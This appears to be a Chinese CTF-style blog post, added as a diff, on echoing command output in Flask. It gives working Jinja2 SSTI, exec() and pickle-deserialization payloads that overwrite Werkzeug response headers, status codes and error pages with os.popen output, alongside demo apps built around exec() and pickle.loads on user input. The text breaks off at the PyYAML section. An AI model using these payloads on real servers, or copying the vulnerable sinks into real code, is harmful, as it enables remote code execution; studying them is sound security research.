@@ -1,0 +1,962 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="p0l1st">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/01/24/flask新回显方式/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="false">
+<meta property="og:type" content="article">
+<meta property="og:title" content="flask新回显方式">
+<meta property="og:url" content="http://example.com/2025/01/24/flask%E6%96%B0%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/index.html">
+<meta property="og:site_name" content="p0l1st&#39;s blog">
+<meta property="og:description" content="false">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321390.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321329.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321355.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321361.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321376.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321321.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321808.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321312.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321070.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321081.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321149.png">
+<meta property="article:published_time" content="2025-01-24T15:19:23.000Z">
+<meta property="article:modified_time" content="2025-01-24T15:24:29.325Z">
+<meta property="article:author" content="p0l1st">
+<meta property="article:tag" content="Python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321390.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            flask新回显方式 -
+        
+        p0l1st&#39;s blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+        
+            
+    
+            
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"p0l1st's blog","subtitle":{"text":[""],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"path":"/about","icon":"fa-regular fa-user"},"Links":{"path":"/links","icon":"fa-regular fa-link"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":3,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":1,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="p0l1st's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                p0l1st&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    LINKS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links"
+                        >
+                            <span>
+                                LINKS
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">flask新回显方式</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407102114048.jpeg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">p0l1st</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-01-24 23:19:23</span>
+        <span class="mobile">2025-01-24 23:19:23</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-01-24 23:24:29</span>
+            <span class="mobile">2025-01-24 23:24:29</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Python/">Python</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15762">flask请求头回显的学习和探究如何进行错误页面污染回显 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15217">Jinja2-SSTI通过Server请求头带出命令回显 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15431">Jinja2-SSTI 新回显方式技术学习 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>在先知社区拜读了上面三篇文章，原理其实就是污染HTTP响应头和错误页面为我们命令执行的结果。</p>
+<p>但是这三篇文章讲的都是基于SSTI的污染，如果是其他漏洞场景呢，比如反序列化、代码执行。</p>
+<p>强网杯线下赛有一道pyramid的题，漏洞点存在于exec()，有种方法就是污染响应内容。所以我们可以把基于SSTI污染的payload先改成<code>exec</code>可以执行的代码。</p>
+<p>关于SSTI回显分析的过程不再演示，参考上面三篇文章就行，先附上基于SSTI污染的payload。</p>
+<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h2 id="server-version"><a href="#server-version" class="headerlink" title="server_version"></a>server_version</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;g.pop.__globals__.__builtins__.<span class="built_in">setattr</span>(g.pop.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,<span class="string">&quot;server_version&quot;</span>,g.pop.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read())&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="sys-version"><a href="#sys-version" class="headerlink" title="sys_version"></a>sys_version</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;g.pop.__globals__.__builtins__.<span class="built_in">setattr</span>(g.pop.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,<span class="string">&quot;sys_version&quot;</span>,g.pop.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read())&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="http-protocol-version"><a href="#http-protocol-version" class="headerlink" title="http protocol_version"></a>http protocol_version</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__.__builtins__.<span class="built_in">setattr</span>(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,<span class="string">&quot;protocol_version&quot;</span>,lipsum.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read())&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[<span class="string">&#x27;setattr&#x27;</span>](lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.wrappers.Response,<span class="string">&#x27;default_status&#x27;</span>,url_for.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;base64&#x27;</span>).b64encode(url_for.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;dir&#x27;</span>).read().encode()).decode())&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="500页面"><a href="#500页面" class="headerlink" title="500页面"></a>500页面</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[<span class="string">&#x27;setattr&#x27;</span>](lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.exceptions.InternalServerError,<span class="string">&#x27;description&#x27;</span>,url_for.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;dir&#x27;</span>).read())&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="404页面"><a href="#404页面" class="headerlink" title="404页面"></a>404页面</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[<span class="string">&#x27;setattr&#x27;</span>](lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.exceptions.NotFound,<span class="string">&#x27;description&#x27;</span>,url_for.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;dir&#x27;</span>).read())&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h1><p>demo</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/e&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>():</span><br><span class="line">    p0 = request.args.get(<span class="string">&quot;p0&quot;</span>)</span><br><span class="line">    <span class="built_in">exec</span>(p0)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>然后把payload改成<code>exec</code>可以直接执行的代码，其实也就是从相应模块中导入类，再使用<code>setattr</code>把类中对应的属性<strong>污染为我们命令执行的结果</strong>。</p>
+<h2 id="server-version-1"><a href="#server-version-1" class="headerlink" title="server_version"></a>server_version</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.serving <span class="keyword">import</span> WSGIRequestHandler; <span class="keyword">import</span> os; <span class="built_in">setattr</span>(WSGIRequestHandler, <span class="string">&quot;server_version&quot;</span>, os.popen(<span class="string">&#x27;whoami&#x27;</span>).read().strip())</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321390.png" alt="image-20250124211207028"></p>
+<h2 id="sys-version-1"><a href="#sys-version-1" class="headerlink" title="sys_version"></a>sys_version</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.serving <span class="keyword">import</span> WSGIRequestHandler; <span class="keyword">import</span> os; <span class="built_in">setattr</span>(WSGIRequestHandler, <span class="string">&quot;sys_version&quot;</span>, os.popen(<span class="string">&#x27;whoami&#x27;</span>).read().strip())</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321329.png" alt="image-20250124211246497"></p>
+<h2 id="http-protocol-version-1"><a href="#http-protocol-version-1" class="headerlink" title="http protocol_version"></a>http protocol_version</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.serving <span class="keyword">import</span> WSGIRequestHandler; <span class="keyword">import</span> os; <span class="built_in">setattr</span>(WSGIRequestHandler, <span class="string">&quot;protocol_version&quot;</span>, os.popen(<span class="string">&#x27;whoami&#x27;</span>).read().strip())</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321355.png" alt="image-20250124211048100"></p>
+<h2 id="状态码-1"><a href="#状态码-1" class="headerlink" title="状态码"></a>状态码</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.wrappers <span class="keyword">import</span> Response; <span class="keyword">import</span> os; <span class="keyword">import</span> base64; <span class="built_in">setattr</span>(Response, <span class="string">&#x27;default_status&#x27;</span>, base64.b64encode(os.popen(<span class="string">&#x27;whoami&#x27;</span>).read().encode()).decode())</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321361.png" alt="image-20250124213243947"></p>
+<img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321376.png" alt="image-20250124213309765" style="zoom:67%;">
+
+
+
+
+
+<h2 id="500页面-1"><a href="#500页面-1" class="headerlink" title="500页面"></a>500页面</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.exceptions <span class="keyword">import</span> InternalServerError; <span class="keyword">import</span> os; <span class="built_in">setattr</span>(InternalServerError, <span class="string">&quot;description&quot;</span>, os.popen(<span class="string">&#x27;whoami&#x27;</span>).read().strip())</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321321.png" alt="image-20250124204943133"></p>
+<h2 id="404页面-1"><a href="#404页面-1" class="headerlink" title="404页面"></a>404页面</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.exceptions <span class="keyword">import</span> NotFound; <span class="keyword">import</span> os; <span class="built_in">setattr</span>(NotFound, <span class="string">&quot;description&quot;</span>, os.popen(<span class="string">&#x27;whoami&#x27;</span>).read().strip())</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321808.png" alt="image-20250124205615201"></p>
+<h1 id="Pickle反序列化"><a href="#Pickle反序列化" class="headerlink" title="Pickle反序列化"></a>Pickle反序列化</h1><p>上面已经构造出了<code>exec</code>可以执行的代码，那么这个payload同样在pickle反序列化也是可以使用的，前提是通过<code>exec</code>执行。</p>
+<p>demo</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    p = request.args.get(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">    pickle.loads(base64.b64decode(p))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>exp</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cmd</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;from werkzeug.serving import WSGIRequestHandler; import os; setattr(WSGIRequestHandler, \&quot;server_version\&quot;, os.popen(&#x27;whoami&#x27;).read().strip())&quot;</span>,))</span><br><span class="line">A= cmd()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(A)))</span><br></pre></td></tr></table></figure></div>
+
+<p>污染成功</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501242321312.png" alt="image-20250124215341695"></p>
+<h1 id="PyYaml反序列化"><a href="#PyYaml反序列化" class="headerlink" title="PyYaml反序列化"></a>PyYaml反序列化</h1><p>同样也是通过<code>exec</code>来执行</p>
+<p>这里就以DASCTF2024最后一战yaml_master为例</p>
